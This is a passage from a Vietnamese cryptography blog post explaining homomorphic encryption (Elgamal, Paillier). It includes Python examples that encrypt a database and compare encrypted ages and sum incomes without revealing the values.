src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-4.png?resize=463%2C159&#038;ssl=1" alt="Untitled" width="463" height="159" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-4.png?w=463&amp;ssl=1 463w, https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-4.png?resize=300%2C103&amp;ssl=1 300w" sizes="(max-width: 463px) 100vw, 463px" data-recalc-dims="1" /></a></p>
+<p>Hệ mã hoá Elgamal có tính chất đồng cấu, nhờ nó có thể tính được kết quả trong cuộc bỏ phiếu “chọn một trong hai”, mà không cần giải mã từng lá phiếu. Sơ đồ chia sẻ bí mật Shamir phối hợp với hệ mã hoá Elgamal còn có tính chất đặc biệt hơn nữa, nhờ nó có thể chia lá phiếu thành nhiều mảnh, cử tri gửi mỗi mảnh cho một thành viên ban kiểm phiếu, khi khớp các mảnh phiếu lại sẽ được nội dung đầy đủ của lá phiếu. Bài báo này trình bày các tính chất trên và chỉ ra ứng dụng của chúng trong bỏ phiếu từ xa.Hệ mã hoá Elgamal có tính chất đồng cấu, nhờ nó có thể tính được kết quả trong cuộc bỏ phiếu “chọn một trong hai”, mà không cần giải mã từng lá phiếu. Sơ đồ chia sẻ bí mật Shamir phối hợp với hệ mã hoá Elgamal còn có tính chất đặc biệt hơn nữa, nhờ nó có thể chia lá phiếu thành nhiều mảnh, cử tri gửi mỗi mảnh cho một thành viên ban kiểm phiếu, khi khớp các mảnh phiếu lại sẽ được nội dung đầy đủ của lá phiếu. (ref2 Trịnh Nhật Tiến, Đặng Thu Hiền, Trương Thị Thu Hiền, Lương Việt Nguyên)</p>
+<p class="">Để rõ thêm về vấn đề này, bạn đọc có thể xem lại bài <a href="https://babyphd.net/2016/03/introduction-to-threshold-signature-scheme/">Introduction to Threshold signature scheme</a>. Lưu ý Elgamal có tính chất đồng cấu còn RSA thì không nhé <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?ssl=1"><img data-attachment-id="568" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/surrender/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="surrender" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-568" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?resize=25%2C25&#038;ssl=1" alt="surrender" width="25" height="25" data-recalc-dims="1" /></a>. Ở khuôn khổ bài viết này chỉ trình bày thêm về hệ mã Paillier công bố năm 1999 như sau:</p>
+<p class="">Giả sử n = pq và g là một phần tử đặc biết của <a href="https://vi.wikipedia.org/wiki/Nh%C3%B3m_(to%C3%A1n_h%E1%BB%8Dc)#Nh.C3.B3m_xiclic">nhóm cyclic</a> Z dựa theo lũy thừa n sao cho <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_5c6997547b6627b1b35a5ce698c5a298.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>. Khóa bí mật <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_b41b9dd23fcbbf9d222a2b66fd285d85.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>, khóa công khai (g, n). Với plaintext là thông điệp <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_b35275cb2846fd1f47f7772df7bb08fc.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span> và một số r nguyên dương ngẫu nhiên thì hàm mã hóa được định nghĩa:<br />
+<span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_ce9d9741c5d2c87fc79319bb44b3fb85.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span></p>
+<p class="">Lưu ý lcm = least common multiple ước chung nhỏ nhất. Và người ta thường chọn g=n+1 để thỏa mãn tính chất generator như sau:</p>
+<p class=""><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-5.png?ssl=1"><img data-attachment-id="576" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-6/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-5.png?fit=384%2C169&amp;ssl=1" data-orig-size="384,169" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-5.png?fit=300%2C132&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-5.png?fit=384%2C169&amp;ssl=1" class="aligncenter wp-image-576 size-full" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-5.png?resize=384%2C169&#038;ssl=1" alt="Untitled" width="384" height="169" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-5.png?w=384&amp;ssl=1 384w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-5.png?resize=300%2C132&amp;ssl=1 300w" sizes="(max-width: 384px) 100vw, 384px" data-recalc-dims="1" /></a></p>
+<p class="">Còn quá trình giải mã thì phức tạp hơn chút, đó là:</p>
+<p class=""><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?ssl=1"><img data-attachment-id="577" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-7/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?fit=823%2C410&amp;ssl=1" data-orig-size="823,410" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?fit=300%2C149&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?fit=604%2C301&amp;ssl=1" class="alignnone wp-image-577 " src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?resize=542%2C270&#038;ssl=1" alt="Untitled" width="542" height="270" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?w=823&amp;ssl=1 823w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?resize=300%2C149&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?resize=768%2C383&amp;ssl=1 768w" sizes="(max-width: 542px) 100vw, 542px" data-recalc-dims="1" /></a></p>
+<p class="">Vậy tại sao có RSA phổ cập nông thôn đã chất chơi người dơi rồi, các nhà mật mã học lại phải nghĩ ra hệ mật oái ăm này <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?ssl=1"><img class="alignnone wp-image-568" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?resize=24%2C24&#038;ssl=1" alt="surrender" width="24" height="24" data-recalc-dims="1" /></a>. Ấy là vì ở đây ta có random r, mỗi lần mã hóa lại có ciphertext khác nhau. Ngoài ra với mỗi ciphertext nếu không biết random r thì lại ra vô số message m thỏa khác nhau. Ngoài ra với tính chất đồng cấu giúp cho phép cộng (+) và lũy thừa (^) ta có thể thiết kế các giao thức mã hóa gửi đi ciphertext để một bên thứ ba tính toán, bên tính toán này chỉ trả về kết quả phép tính mà không biết giá trị mà bên cần tính đưa ra là gì <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?ssl=1"><img data-attachment-id="565" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/boss/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="boss" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-565" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?resize=27%2C27&#038;ssl=1" alt="boss" width="27" height="27" data-recalc-dims="1" /></a></p>
+<p class=""><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-7.png?ssl=1"><img data-attachment-id="578" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-8/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-7.png?fit=659%2C153&amp;ssl=1" data-orig-size="659,153" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-7.png?fit=300%2C70&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-7.png?fit=604%2C140&amp;ssl=1" class="alignnone wp-image-578 size-full" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-7.png?resize=604%2C140&#038;ssl=1" alt="Untitled" width="604" height="140" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-7.png?w=659&amp;ssl=1 659w, https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-7.png?resize=300%2C70&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p class="">Ví dụ giao thức đơn giản Alice có <strong>publickey</strong> (để mã hóa) và 2 số tiền của 2 orders mà Bob đặt hàng đã được mã hóa<strong> [a], [b]</strong>. Alice không thể giải mã để biết <strong>a, b</strong> nhưng lại muốn tính tổng tiền<strong> [a+b]</strong>. Bob ở đây có <strong>secretkey</strong> có khả năng giải mã để tính phép cộng cho Alice nhưng hệ thông không muốn Bob biết Alice đang muốn tính gì.</p>
+<p class=""><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-8.png?ssl=1"><img data-attachment-id="579" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-9/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-8.png?fit=724%2C273&amp;ssl=1" data-orig-size="724,273" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-8.png?fit=300%2C113&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-8.png?fit=604%2C228&amp;ssl=1" class="alignnone size-full wp-image-579" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-8.png?resize=604%2C228&#038;ssl=1" alt="Untitled" width="604" height="228" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-8.png?w=724&amp;ssl=1 724w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-8.png?resize=300%2C113&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p class="">Alice bằng việc sử dụng random <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_2943eb743cec6d95e34639874f2d6a27.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span> khiến cho Bob không biết đường nào mà lần, dù anh có giải mã ra a mũ và b ngã thì vẫn không đoán được a,b là gì. Tuy nhiên cũng xin lưu ý ở đây rằng, để đảm bảo giao thức hoạt động ngon thì random cần có một độ dài k bits cần thiết nhé. Lúc implement bị hack thì đừng đổ cho chụy không nói trước <a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/look_down.png?ssl=1"><img data-attachment-id="580" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/look_down/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/look_down.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="look_down" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/look_down.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/look_down.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-580" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/look_down.png?resize=25%2C25&#038;ssl=1" alt="look_down" width="25" height="25" data-recalc-dims="1" /></a>.</p>
+<p class=""><strong>5. Ví dụ ứng dụng</strong></p>
+<p class="">Phần này với bạn đọc nào hiểu rõ học thuật rồi có thể skip sang luôn phần like subcribe comment và share trên phây búc. Dưới đây chỉ là bài toán ví dụ đơn giản trẻ con sử dụng Pailler để bảo vệ các thông tin như: tuổi, thu nhập bằng Python.</p>
+<p class=""><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-9.png?ssl=1"><img data-attachment-id="581" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-10/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-9.png?fit=561%2C312&amp;ssl=1" data-orig-size="561,312" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-9.png?fit=300%2C167&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-9.png?fit=561%2C312&amp;ssl=1" class="alignnone size-full wp-image-581" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-9.png?resize=561%2C312&#038;ssl=1" alt="Untitled" width="561" height="312" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-9.png?w=561&amp;ssl=1 561w, https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-9.png?resize=300%2C167&amp;ssl=1 300w" sizes="(max-width: 561px) 100vw, 561px" data-recalc-dims="1" /></a></p>
+<p class="">Đầu tiên, giả sử tôi có một hệ cơ sở dữ liệu cần mã hóa Paillier với 3 cột: Tên, tuổi, thu nhập. Tôi xin ăn cắp thư viện Pure Python Paillier Homomorphic Cryptosystem (3) để mã hóa dưới đây:</p>
+<pre class="lang:python decode:true">from paillier.paillier import *
+from timer import Timer
+import random,string
+
+def encrypt_db():
+	print "Encrypting...."
+	for p in session.query(Person):
+		p.age = str(encrypt(pub, int(p.age)))
+		p.income = str(encrypt(pub, int(p.income)))
+		p.name = str(int(p.name.encode("hex"),16))
+	session.commit()
+
+def decrypt_db():
+	print "Decrypting...."
+	for p in session.query(Person):
+		print decrypt(priv, pub, int(p.age)) ,decrypt(priv, pub, int(p.income)) , hex(decrypt(priv, pub, int(p.name ))).replace("0x","").replace("L","")
+
+print "Generating keypair..."
+priv, pub =  generate_keypair(2048)
+</pre>
+<p>Với quyền query lên database toàn bộ bị mã hóa, tôi có 2 bài toán cần giải quyết đó là:</p>
+<ul>
+<li>Nhập lên một số <em>x</em>, yêu cầu trả lời câu hỏi có bao nhiêu người có độ tuổi lớn hơn x mà không làm lộ số <em>x</em> đang được hỏi.</li>
+<li>Tính tổng thu nhập của tất cả những người có độ tuổi lớn hơn x mà không làm lộ thông tin thu nhập của từng người.</li>
+</ul>
+<p>Đề giải quyết 2 bài toán trên, tôi tham khảo giao thức tính toán không làm lộ dữ liệu được cải tiến của Zerkin (4) bạn tôi như sau:</p>
+<p><img class="alignnone size-full" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/u.jpg?resize=604%2C958&#038;ssl=1" alt="" width="604" height="958" data-recalc-dims="1" /></p>
+<p>Hàm gửi lên để lấy kết quả ta chỉ cần quan tâm tới hàm A(pub, enc_a, enc_b). Ở đây được code như sau (code bừa hơi dài đề nghị không gạch đá <a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?ssl=1"><img data-attachment-id="586" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/beat_brick/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="beat_brick" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-586" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?resize=27%2C27&#038;ssl=1" alt="beat_brick" width="27" height="27" data-recalc-dims="1" /></a>):</p>
+<pre class="lang:python decode:true ">from paillier.paillier import *
+import random,string
+
+l=17
+def A(pub, enc_a, enc_b):
+	enc_z = e_add(pub, e_add(pub, enc_a, encrypt(pub, 2**l)), invmod(enc_b,pub.n_sq))
+	r = random.randrange(2**(80+l+1))
+
+	r_bin = bin(r).replace("0b","").replace("L","")
+	r_bin = "0"* (l-len(r_bin))+r_bin
+	r_bin = r_bin[::-1]
+	enc_r = encrypt(pub, r)
+	enc_d = e_add(pub, enc_z , enc_r)
+	enc_d1, enc_d2 , enc_t = B1(enc_d)
+	s = [-1,1][random.randint(0,1)]
+
+	h = [0]*l
+	v = [0]*l
+	enc_c = [0]*l
+	enc_e = [0]*l
+	for i in range(l):
+		while True:
+			h[i] = random.getrandbits(long(round(math.log(pub.n, 2))))
+			if h[i] &gt; 0 and h[i] &lt; pub.n and gcd(h[i], pub.n) == 1:
+				break
+
+	for i in range(l):
+		v[i] = s - int(r_bin[i])
+		for j in range(i+1,l):
+			v[i] -= (2**j) * int(r_bin[j])
+		if v[i] &lt; 0: 
+			v[i] = pub.n + v[i]
+		enc_c[i] = e_add(pub, encrypt(pub, v[i]), enc_t[i])
+		enc_e[i] = pow (enc_c[i], h[i],pub.n_sq)
+
+	enc_lamda = B2(enc_e)
+	if s != 1:
+		enc_lamda = e_add(pub, encrypt(pub,1), invmod(enc_lamda,pub.n_sq))
+	enc_zl = e_add(pub, e_add(pub, enc_d2, invmod(encrypt(pub,(r / 2**l)),pub.n_sq)), invmod(enc_lamda,pub.n_sq))
+	return B3(enc_zl)
+
+def B1(enc_d):
+	d= decrypt(priv, pub, enc_d)
+	d1 = d%(2**l)
+	d2 = d/(2**l)
+	d_bin = bin(d1).replace("0b","").replace("L","")
+	d_bin = "0"* (l-len(d_bin))+d_bin
+	d_bin = d_bin[::-1]
+	t = [int(0)]*l
+	for i in range(l):
+		t[i] = int(d_bin[i])
+		for j in range(i+1,l):
+			t[i] += (2**j) * int(d_bin[j])
+		t[i] = encrypt(pub, t[i])
+	return encrypt(pub,d1) , encrypt(pub,d2),t
+def B2(enc_e):
+	e = [int(0)]*l
+	for i in range(l):
+		e[i] = decrypt(priv, pub, enc_e[i])
+		if e[i] ==0: return encrypt(pub,1)
+	return encrypt(pub,0)
+
+
+def B3(enc_zl):
+	return decrypt(priv,pub, enc_zl)</pre>
+<p>Vậy với bài toán 1, để biết bao người có số tuổi từ x đổ lên ta chỉ cần query bằng hàm A():</p>
+<pre class="lang:default decode:true">index = [-1]*len(income)	
+for i in range(len(age)):
+	enc_x = encrypt(pub, x)
+	if int(A(pub, age[i],  enc_x))&gt;0:
+		index[number] = i
+		number+=1</pre>
+<p>Với bài toán 2, để thêm phần bảo mật ta nhét thêm một số random r thật dài vào mỗi lần query như sau:</p>
+<pre class="lang:default decode:true">	r = random.randrange(2**(80+32))
+	for i in index:
+		if i&gt;-1:
+			totalincome = e_add(pub, totalincome, income[i])
+	totalincome = e_add(pub, totalincome, encrypt(pub,r))
+	totalincome = decrypt(priv,pub,totalincome) - r</pre>
+<p>Thật là đơn giản phải không <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?ssl=1"><img data-attachment-id="568" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/surrender/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="surrender" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-568" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?resize=25%2C25&#038;ssl=1" alt="surrender" width="25" height="25" data-recalc-dims="1" /></a>, nếu bạn vẫn chưa hiểu, xin đừng liên hệ tôi vì tôi sẽ không giải thích đâu. Xin mời bạn đọc phần appendix nhé.</p>
+<ol>
+<li>"Protocols for secure computations". <i>FOCS</i>. 23rd Annual Symposium on Foundations of Computer Science (FOCS 1982): 160–164.<a title="Digital object identifier" href="https://en.wikipedia.org/wiki/Digital_object_identifier">doi</a>:<a class="external text" href="https://dx.doi.org/10.1109%2FSFCS.1982.88" rel="nofollow">10.1109/SFCS.1982.88</a></li>
+<li>Mã hoá đồng cấu và ứng dụng http://tapchi.vnu.edu.vn/tckh/news/?1887/635/Ma-hoa-dong-cau-va-ung-dung.htm</li>
+<li>https://github.com/mikeivanov/paillier</li>
+<li>Z. Erkin, M. Franz, J. Guajardo, S. Katzenbeisser, R. L. Lagendijk and T. Toft, Privacy- Preserving Face Recognition, 9th International Symposium on Privacy Enhancing Technologies, LNCS 5672, pp. 235-253, August 2009.</li>
+</ol>
+<h1>Appendix:</h1>
+<p><strong>Ứng dụng hệ mã hóa đồng cấu trong nhận dạng hình ảnh tội phạm</strong> (vẫn đảm bảo quyền bảo vệ hệ thống hình ảnh tội phạm, cũng như không làm lộ khuôn mặt người cần kiểm tra):</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?ssl=1"><img data-attachment-id="582" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-11/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?fit=790%2C1496&amp;ssl=1" data-orig-size="790,1496" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?fit=158%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?fit=541%2C1024&amp;ssl=1" class="alignnone size-full wp-image-582" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?resize=604%2C1144&#038;ssl=1" alt="Untitled" width="604" height="1144" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?w=790&amp;ssl=1 790w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?resize=158%2C300&amp;ssl=1 158w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?resize=768%2C1454&amp;ssl=1 768w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-10.png?resize=541%2C1024&amp;ssl=1 541w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p><strong>Tính toán không lộ thông tin (ghi chú phần 4)</strong></p>
